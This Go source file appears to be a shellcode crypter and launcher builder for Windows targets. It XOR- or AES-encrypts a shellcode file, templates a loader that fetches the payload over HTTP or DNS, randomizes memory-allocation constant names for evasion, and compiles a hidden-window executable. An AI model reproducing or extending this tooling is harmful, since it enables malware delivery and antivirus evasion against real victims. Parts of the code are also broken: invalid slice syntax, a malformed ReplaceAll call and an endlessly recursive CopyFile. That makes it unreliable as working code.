package main

import (
	"flag"
	"os"
	"math/rand"
	"io/ioutil"
	"encoding/base64"
	"strings"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"strconv"
	"os/exec"
	"bytes"

	log "github.com/sirupsen/logrus"
)

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func BuildPayload() {
	log.Info("Building payload for windows target")

	arg0 := "go"
	arg1 := "build"
	arg2 := "-ldflags"
	arg3 := "-H=windowsgui"
	arg5 := "-o=launcher.exe"
	arg7 := "tmp.go"

	cmd := exec.Command(arg0, arg1, arg2, arg3, arg5, arg7)

	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "GOOS=windows")
	cmd.Env = append(cmd.Env, "")

	var out bytes.Buffer
	var stderr bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Error(stderr.String())
		return
	}

	log.Info("Binary written to launcher.exe")
}

func StringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}

	return false
}

func RandStringBytes(n int) string {
	b := make([]byte, n)

	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}

	return string(b)
}

func AESKeyPadding(byte_array []byte) []byte {
	if len(byte_array) == 32 {
		return byte_array
	} else {
		if len(byte_array) < 32 {
			bytes_to_add := 32 - len(byte_array)


			for i := 0; i < bytes_to_add; i++ {
				byte_array = append(byte_array, byte('A'))
			}

			return byte_array
		} else {
			byte_array = byte_array[0:32]
		}

		return byte_array
	}
}

func PlaintextB64Encode(shellcode_file string) string {
	log.Info("Not performing any encryption. Encoding the file.")

	plaintext, _ := ioutil.ReadFile(shellcode_file)

	plaintext_b64 := base64.StdEncoding.EncodeToString([]byte(plaintext))

	log.Info("Generated encoded text: " + plaintext_b64)

	return plaintext_b64
}

func EncryptAES(shellcode_file string, key string) string {
	log.Info("Performing AES encryption on file " + shellcode_file + " using key: " + key)

	plaintext, _ := ioutil.ReadFile(shellcode_file)
	key_byte := []byte(key)

	c, err := aes.NewCipher(key_byte)
	if err != nil {
		log.Error(err)
	}

	IV := []byte("1234567812345678")

	stream := cipher.NewCTR(c, IV)
	stream.XORKeyStream(plaintext, plaintext)
	ciphertext := plaintext

	ciphertext_b64 := base64.StdEncoding.EncodeToString(ciphertext)

	log.Info("Generated encoded text: " + ciphertext_b64)

	return ciphertext_b64
}

func EncryptXOR(shellcode_file string, key string) string {
	log.Info("Performing XOR encryption on file " + shellcode_file + " using key: " + key)

	plaintext, _ := ioutil.ReadFile(shellcode_file)
	key_byte := []byte(key)

	ciphertext := make([]byte, len(plaintext))

	for i := 0; i < len(plaintext); i++ {
		ciphertext[i] = plaintext[i] ^ key_byte[i % len(key_byte)]
	}

	ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext))

	log.Info("Generated ciphertext: " + ciphertext_b64)

	return ciphertext_b64
}

func CopyFile(src, dst string) (err error) {
	sfi, err := os.Stat(src)
	if err != nil {
		log.Error(err)
		return
	}

	dfi, err := os.Stat(dst)
	if err != nil {
		if !os.IsNotExist(err) {
			return
		}
	} else {
		if !(dfi.Mode().IsRegular()) {
			return fmt.Errorf("CopyFile: non-regular destination file %s (%q)", dfi.Name(), dfi.Mode().String())
		}

		if os.SameFile(sfi, dfi) {
			return
		}
	}

	if err = os.Link(src, dst); err == nil {
		return
	}

	err = CopyFile(src, dst)

	return
}

func main() {
	var crypter_mode string
	var download_mode string
	var execution_mode string
	var shellcode_file string
	var download_src string
	var randomization bool
	var debug bool

	flag.StringVar(&crypter_mode, "crypter_mode", "xor", "The encryption mode to use for the shellcode (xor, aes, none). Default: xor")
	flag.StringVar(&download_mode, "download_mode", "http", "The method to use for downloading the payload (http, dns, none). Default: http")
	flag.StringVar(&download_src, "download_src", "", "The URL that will point to the payload (for http) or the domain name with the TXT record containing the payload (for dns).")
	flag.StringVar(&execution_mode, "execution_mode", "1", "The method to use for execution of the shellcode. This is a numerical value. See README for detailed explanation of modes.")
	flag.StringVar(&shellcode_file, "shellcode_file", "", "The path and filename for the file containing the binary shellcode to be executed by the launcher")
	flag.BoolVar(&randomization, "randomization", true, "Whether to randomize elements within the launcher (true/false).")
	flag.BoolVar(&debug, "debug", true, "Place the payload in debug mode (true/false).")

	flag.Parse()

	crypter_mode = strings.ToLower(crypter_mode)
	download_mode = strings.ToLower(download_mode)
	execution_mode = strings.ToLower(execution_mode)

	log.SetFormatter(&log.JSONFormatter{})
	log.SetLevel(log.InfoLevel)

	var crypter_modes = []string{"aes", "xor", "none"}
	var download_modes = []string{"http", "dns", "none"}
	var execution_modes = []string{"1"}
	var key string
	var ciphertext_b64 string

	log.Info(crypter_mode)

	// validate modes
	if StringInSlice(crypter_mode, crypter_modes) {
		log.Info("Crypter mode is valid.")
	} else {
		log.Info("Crypter mode is invalid.")
		os.Exit(3)
	}

	if StringInSlice(download_mode, download_modes) {
		log.Info("Download mode is valid.")
	} else {
		log.Info("Download mode is invalid.")
		os.Exit(3)
	}

	if StringInSlice(execution_mode, execution_modes) {
		log.Info("Execution mode is valid.")
	} else {
		log.Info("Execution mode is invalid.")
		os.Exit(3)
	}

	// validate path to shellcode file
	if _, err := os.Stat(shellcode_file); err == nil {
		log.Info("Shellcode file exists.")
	} else {
		log.Error("Shellcode file does not exist. Exiting.")
		os.Exit(3)
	}

	// if encryption mode, generate random key, print to console
	key = RandStringBytes(32)

	// encrypt shellcode using algorithm selected and key, or don't if none
	if crypter_mode == "xor" {
		ciphertext_b64 = EncryptXOR(shellcode_file, key)
	} else if crypter_mode == "aes" {
		ciphertext_b64 = EncryptAES(shellcode_file, key)
	} else {
		ciphertext_b64 = PlaintextB64Encode(shellcode_file)
	}

	// output base64 ciphertext to file, print path and truncated contents
	output_file_path := "./shellcode_ciphertext.b64.out"

	f, err := os.Create(output_file_path)
	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString(ciphertext_b64)
	if err2 != nil {
		log.Fatal(err2)
	}

	log.Info("Wrote base64 encoded ciphertext payload to: " + output_file_path)

	// based on other selections, select template
	// insert remaining data into templates
	// create randomization string, insert into template
	randomizer := RandStringBytes(12)

	template_file := "./templates/1.template"
	tmp_go_file := "./tmp.go"

	content, _ := ioutil.ReadFile(template_file)

	new_content := strings.ReplaceAll(string(content), "{{RANDOMIZER}}", "\"" + randomizer + "\"")
	new_content = strings.ReplaceAll(new_content, "{{CRYPTER_MODE}}", "\"" + crypter_mode + "\"")
	new_content = strings.ReplaceAll(new_content, "{{DOWNLOAD_MODE}}", "\"" + download_mode + "\"")
	new_content = strings.ReplaceAll(new_content, "{{EXECUTION_MODE}}", "\"" + execution_mode + "\"")
	new_content = strings.ReplaceAll(new_content, "{{DOWNLOAD_SRC}}", "\"" + download_src + "\"")
	new_content = strings.ReplaceAll(new_content, "{{DEBUG}}", strconv.FormatBool(debug))
	new_content = strings.ReplaceAll(new_content, "{{KEY}}", "\"" + key + "\"")

	f, err = os.Create(tmp_go_file)
	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err = f.WriteString(new_content)
	if err != nil {
		log.Fatal(err)
	}

	log.Info("Wrote tmp file")

	content = string(ioutil.ReadFile(tmp_go_file))

	var variable_names = [string]{"MEM_COMMIT", "MEM_RESERVE", "PAGE_EXECUTE_READ", "PAGE_READWRITE"}
	for i := range(variable_names) {
		new_var_name := RandStringBytes(10)
		new_content = strings.ReplaceAll(variable_names[i], new_var_name)
	}

	// if randomization, randomize variable names in template
	// generate binary
	BuildPayload()

	// delete tmp file

	// print relevant information to the console
}
